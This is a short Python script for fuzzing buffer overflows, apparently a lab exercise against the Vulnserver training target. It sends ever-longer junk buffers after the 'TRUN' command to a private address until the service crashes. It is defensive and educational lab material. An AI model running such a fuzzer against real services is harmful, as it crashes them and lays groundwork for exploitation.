#!/usr/bin/python
#PROGRAM FOR FUZZING BUFFER OVERFLOWS
#YOU SHOULD HAVE IDENTIFIED A VULNERABLE PARAMETER BY NOW USING generic_send_tcp AND A SPIKE SCRIPT (.spk)
import sys, socket
from time import sleep

#Setting params for remote host
RHOST = '192.168.183.129'
RPORT = 9999
COMMAND = 'TRUN /.:/'

#Setting buffer...Just a bunch of junk
buffer = 'A' * 100

#Now to loop through and see where it breaks
while True:
    try:
        #Establishing socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        #Connecting and sending your data
        s.connect((RHOST, RPORT))
        s.send(COMMAND + buffer)
        s.close()

        #Give it a second, and do it again
        sleep(1)

        #Increment the buffer, and push it out again
        buffer = buffer + ('a' * 100)

    except:

        #When the program crashes, you'll have a vage idea of how much data you need to break stuff.
        print("Your buffer crashed the program at %s bytes") % str(len(buffer))

        sys.exit()
